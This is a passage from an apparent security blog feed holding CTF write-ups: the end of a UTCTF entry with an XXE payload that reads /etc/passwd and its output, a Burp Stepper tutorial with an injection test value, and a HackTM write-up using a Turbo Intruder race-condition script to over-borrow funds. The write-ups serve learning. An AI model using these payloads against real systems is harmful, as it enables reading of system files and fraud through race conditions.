Firefox/73.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://web1.utctf.live:5005/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://web1.utctf.live:5005</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>175</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span>&gt;</span><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span><span class="tag">&lt;<span class="name">locationCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;/<span class="name">locationCheck</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sat, 07 Mar 2020 05:54:36 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/1.0.0 Python/3.8.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1234</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Close</span><br><span class="line"></span><br><span class="line"><span class="language-ruby"><span class="title class_">Invalid</span> <span class="title class_">ProductId</span>: <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/ash</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:daemon</span><span class="symbol">:/sbin</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">adm:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">4</span><span class="symbol">:adm</span><span class="symbol">:/var/adm</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">lp:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:lp</span><span class="symbol">:/var/spool/lpd</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:sync</span><span class="symbol">:/sbin</span><span class="symbol">:/bin/sync</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">shutdown:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:shutdown</span><span class="symbol">:/sbin</span><span class="symbol">:/sbin/shutdown</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">halt:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:halt</span><span class="symbol">:/sbin</span><span class="symbol">:/sbin/halt</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">mail:</span><span class="symbol">x:</span><span class="number">8</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:mail</span><span class="symbol">:/var/mail</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">news:</span><span class="symbol">x:</span><span class="number">9</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:news</span><span class="symbol">:/usr/lib/news</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">14</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucppublic</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">operator:</span><span class="symbol">x:</span><span class="number">11</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:operator</span><span class="symbol">:/root</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">man:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">15</span><span class="symbol">:man</span><span class="symbol">:/usr/man</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">postmaster:</span><span class="symbol">x:</span><span class="number">14</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:postmaster</span><span class="symbol">:/var/mail</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">cron:</span><span class="symbol">x:</span><span class="number">16</span><span class="symbol">:</span><span class="number">16</span><span class="symbol">:cron</span><span class="symbol">:/var/spool/cron</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">ftp:</span><span class="symbol">x:</span><span class="number">21</span><span class="symbol">:</span><span class="number">21</span><span class="symbol">:</span><span class="symbol">:/var/lib/ftp</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">sshd:</span><span class="symbol">x:</span><span class="number">22</span><span class="symbol">:</span><span class="number">22</span><span class="symbol">:sshd</span><span class="symbol">:/dev/null</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">at:</span><span class="symbol">x:</span><span class="number">25</span><span class="symbol">:</span><span class="number">25</span><span class="symbol">:at</span><span class="symbol">:/var/spool/cron/atjobs</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">squid:</span><span class="symbol">x:</span><span class="number">31</span><span class="symbol">:</span><span class="number">31</span><span class="symbol">:Squid</span><span class="symbol">:/var/cache/squid</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">xfs:</span><span class="symbol">x:</span><span class="number">33</span><span class="symbol">:</span><span class="number">33</span><span class="symbol">:X</span> <span class="title class_">Font</span> <span class="title class_">Server</span><span class="symbol">:/etc/X11/fs</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">games:</span><span class="symbol">x:</span><span class="number">35</span><span class="symbol">:</span><span class="number">35</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">cyrus:</span><span class="symbol">x:</span><span class="number">85</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:</span><span class="symbol">:/usr/cyrus</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">vpopmail:</span><span class="symbol">x:</span><span class="number">89</span><span class="symbol">:</span><span class="number">89</span><span class="symbol">:</span><span class="symbol">:/var/vpopmail</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">ntp:</span><span class="symbol">x:</span><span class="number">123</span><span class="symbol">:</span><span class="number">123</span><span class="symbol">:NTP</span><span class="symbol">:/var/empty</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">smmsp:</span><span class="symbol">x:</span><span class="number">209</span><span class="symbol">:</span><span class="number">209</span><span class="symbol">:smmsp</span><span class="symbol">:/var/spool/mqueue</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">guest:</span><span class="symbol">x:</span><span class="number">405</span><span class="symbol">:</span><span class="number">100</span><span class="symbol">:guest</span><span class="symbol">:/dev/null</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">nobody:</span><span class="symbol">x:</span><span class="number">65534</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:nobody</span><span class="symbol">:/</span><span class="symbol">:/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">utctf:</span><span class="symbol">x:</span><span class="number">1337</span><span class="symbol">:utflag</span>&#123;n3xt_y3ar_go1ng_bl1nd&#125;</span></span><br></pre></td></tr></table></figure><p>That’s it. Finally thanks to UTCTF Team for the chall. Feel free to contact me on twitter for queries or feedback. Cheers!!</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webappsec </tag>
            
            <tag> writeup </tag>
            
            <tag> sql injection </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Introduction to Burp Suite Plugin Stepper</title>
      <link href="/introduction-to-burp-suite-plugin-stepper/"/>
      <url>/introduction-to-burp-suite-plugin-stepper/</url>
      
        <content type="html"><![CDATA[<p>While trying to solve a CTF challenge I was in a situation where I needed to do multiple steps inorder to test the challenge. Although I wasn’t able to solve the challenge I learned a few things along the way while trying out stepper for the first time. So here is small intro on how stepper can be used in such cases. This is pretty biginner level stuff. May help someone struggling to get started with it. The plugin is available <a href="https://github.com/CoreyD97/Stepper">here</a> or can be downloaded from the BApp Store.</p><p>Let’s get started with the challenge scenario. Below POST request returned a hash value as shown in response. The hash value was needed to be included in the next request to validate the SMS.</p><p>Request1:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/admin.restore</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>sherlock-message.ru</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://sherlock-message.ru</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://sherlock-message.ru/admin</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure><p>Response1:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 16 Feb 2020 09:32:39 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>95</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span><span class="punctuation">,</span><span class="attr">&quot;response&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;need_sms&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;new_hash&quot;</span><span class="punctuation">:</span><span class="string">&quot;0e2eafbefa3343f7dd43fa34e58e8d8b&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>SMS validation request is as below. Uses hash value from previous request(above) along with the sms code.<br>Request2:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/admin.restore</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>sherlock-message.ru</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>51</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://sherlock-message.ru</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://sherlock-message.ru/admin</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">hash</span>=<span class="number">0</span>e2eafbefa3343f7dd43fa34e58e8d8b&amp;sms_code=<span class="number">123456</span></span></span><br></pre></td></tr></table></figure><p>Response2:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 16 Feb 2020 09:32:39 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>95</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;success&quot;</span><span class="punctuation">,</span><span class="attr">&quot;response&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;need_sms&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;new_hash&quot;</span><span class="punctuation">:</span><span class="string">&quot;5c608733c8545b4633cc31a400959e03&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>As we can see a new token is returned in the above response. The old one expires and gives error if used again. In order to test the validation request, the new token is required to be used in the next SMS validation request. The hash acts like a anti-CSRF token here. So repeating first request, than copying the hash&#x2F;token and using it in second request becomes a lot of tedious work using just the repeater. This is where stepper comes in and does a lot of heavy lifting. Let’s see how it can be used.</p><p>We send the first request to the stepper and use a regex to capture the token&#x2F;hash from response. Create a variable using Add Variable for that, random variable name will be created.</p><p>Tip: Variables can be renamed by double clicking the Identifier.<br><img src="/introduction-to-burp-suite-plugin-stepper/4.1.jpg" alt="alt"><br>Let’s understand how the follwoing regex is used. Regex:  (?:”new_hash”:”)(.*?)(?:”)</p><p>First group of the regex (?:”new_hash”:”) is non-capturing, proves as a starting point for the string and checks occurrence of “new_hash”:”</p><p>Second group (.*?) which is capturing group, will collect everything after the first group untill the third group is found.</p><p>Third group (?:”) again a non capturing group to mark end of collection and it checks for “</p><p>More explanation can be found by inserting the above regex <a href="https://regexr.com/">here</a></p><p>Now the captured hash is stored in hash variable. These variables can be accessed using the syntax $VAR:VARIABLE_IDENTIFIER$ or $var:VARIABLE_IDENTIFIER$.</p><p>We forward the second request to stpper now and use the previously collected hash here using $VAR:hash$. Now we can Execute Sequence and second step should take the hash from first step and use it. Execute Sequence executes all the steps mentioned there from Step 1 to Step 2 to … Step N in that order.</p><p><img src="/introduction-to-burp-suite-plugin-stepper/4.2.jpg" alt="alt"></p><p>Let’s check the Stepper Replacement tab as below and we should see the variable being replaced by the actual value. Alternatively another plugin such as logger++ or flow can also be used to check that variables are replaced as required. </p><p>Note: Hash value varies here because I took the screenshot later on.</p><p><img src="/introduction-to-burp-suite-plugin-stepper/4.3.jpg" alt="alt"></p><p>Now insert your payloads and start testing the same away as repeater. A sample request with a payload would look something like below. Insert your payloads and hit Execute Sequence and it should work smoothly.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/admin.restore</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>sherlock-message.ru</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>51</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://sherlock-message.ru</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://sherlock-message.ru/admin</span><br><span class="line"></span><br><span class="line"><span class="language-arcade"><span class="built_in">hash</span>=$<span class="keyword">VAR</span>:<span class="built_in">hash</span>$&amp;sms_code=<span class="number">1</span><span class="string">&#x27;--</span></span></span><br></pre></td></tr></table></figure><p>We can also use the same variable again anywhere in the request. An example of this would be something like below.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash=$VAR:hash$&amp;sms_code=$VAR:hash$</span><br></pre></td></tr></table></figure><p>That’s it. Effective way to use the stepper and continue the testing on the request without tedious back and forth between multiple request using multiple values. Feel free to ping me on twitter for any feedback or queries. I will try to help as much as I can.</p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webappsec </tag>
            
            <tag> burp suite </tag>
            
            <tag> repeater </tag>
            
            <tag> stepper </tag>
            
            <tag> plugin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solving My Bank from HackTM CTF Quals 2020</title>
      <link href="/solving-my-bank-from-hacktm-ctf-quals-2020/"/>
      <url>/solving-my-bank-from-hacktm-ctf-quals-2020/</url>
      
        <content type="html"><![CDATA[<p>The note for this CTF challenge was as follows.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Who&#x27;s got my money?</span><br><span class="line"></span><br><span class="line">Please abstain from brute-forcing files.</span><br><span class="line"></span><br><span class="line">http://178.128.175.6:50090/</span><br><span class="line"></span><br><span class="line">Author: nytr0gen</span><br></pre></td></tr></table></figure><p>Opening up the page asks you to register a user. So I registered with test1 username. After registering it redirects you to a page which allows you to borrow money from the bank with following restrictions.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: test1</span><br><span class="line">Maximum Loan: 600.00 tBTC</span><br><span class="line">Money: 0.00 tBTC</span><br><span class="line">Account TTL: 600 seconds</span><br></pre></td></tr></table></figure><p>Another page allows you to buy some things with that loan as shown in below screenshot.</p><p><img src="/solving-my-bank-from-hacktm-ctf-quals-2020/3.1.jpg" alt="alt"></p><p>So the flag costs 1337 tBTC. My initial thought was to try and somehow reduce the cost of the flag and see if we could buy it for lesser or 0 tBTC. When that didnt work I turned my attention to the request that allowed us to borrow money. We could only use amount between 1-100 at a time to request loan. So the request looked as follows.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>178.128.175.6:50090</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://178.128.175.6:50090/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>111</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://178.128.175.6:50090</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=.eJwNy0sKwlAMBdC9ZOyDvF-TuBmJ6Q2UgoLakbj3eubnS_F-5e3z3PGgK2XUO_dqE96tw9bsQyBIToYKkL5MZ6ULHce2_ke1piI6SoiPMlJn8R61aCjYbGlok34nOaYc6w.XjasFg.PWnojQn-C6SpmQjDY7mcqEUjpJQ</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">csrf_token</span>=ImZjMWIwMzE5NWVhMzkzZTlkZjM0N2U3ZWYwZjBlODdlZWZhNjVhMDgi.XjasFg._FcPxt2e1-gKxNulB_K50yGj9yk&amp;loan=<span class="number">100</span></span></span><br></pre></td></tr></table></figure><p>Response was 302 FOUND and we have 100 tBTC in our account. I tried to simply increase the loan amount in the next request but that didnt work. Also requesting loan after exhausting 600 limit didnt work. So the next thing that came to mind was to try race condition on this functionality.I had a feeling that it would work out. Such functionalities are frequently susceptible to race conditions.</p><p>Turbo intruder is an awesome tool with which we can test for it. So I sent the above request to the turbo intruder with marker set at loan&#x3D;100%s and used below python code to test for it. It was picked up from the turbo turbo intruder repo <a href="https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race.py">here</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">queueRequests</span>(<span class="params">target, wordlists</span>):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">                       concurrentConnections=<span class="number">30</span>,</span><br><span class="line">                       requestsPerConnection=<span class="number">100</span>,</span><br><span class="line">                       pipeline=<span class="literal">False</span></span><br><span class="line">                       )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the &#x27;gate&#x27; argument blocks the final byte of each request until openGate is invoked</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    engine.queue(target.req, target.baseInput, gate=<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wait until every &#x27;race1&#x27; tagged request is ready</span></span><br><span class="line">    <span class="comment"># then send the final byte of each request</span></span><br><span class="line">    <span class="comment"># (this method is non-blocking, just like queue)</span></span><br><span class="line">    engine.openGate(<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    engine.complete(timeout=<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handleResponse</span>(<span class="params">req, interesting</span>):</span><br><span class="line">    table.add(req)</span><br></pre></td></tr></table></figure><p>After launching the attack with the above configuration it gave me a bunch of 302 as shown below.<br><img src="/solving-my-bank-from-hacktm-ctf-quals-2020/3.2.jpg" alt="alt"></p><p>I went back and checked the page to see if that worked and I was shown 1400 tBTC in the account which meant the attacked worked quite well.</p><p><img src="/solving-my-bank-from-hacktm-ctf-quals-2020/3.3.jpg" alt="alt"></p><p>Only thing now that was left to do was buy the flag with with 1337 tBTC and retrieve the flag.</p><p><img src="/solving-my-bank-from-hacktm-ctf-quals-2020/3.4.jpg" alt="alt"></p><p>That was the fasted challenge I have ever completed and the first race condition I exploited. Round about an hour including the research required to exploit which wasn’t much as it was quite straight forward. The main point here was to figure out that the vulnerability was the race condition. Having read on race conditions before I could deduce it was a possibility.</p><p>Finally, thanks to HackTM for a nice challenge.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webappsec </tag>
            
            <tag> writeup </tag>
            
            <tag> race condition </tag>
            
            <tag> turbo intruder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solving Execute No Evil from X-MAS CTF 2019</title>
      <link href="/solving-execute-no-evil-from-x-mas-ctf-2019/"/>
      <url>/solving-execute-no-evil-from-x-mas-ctf-2019/</url>
      
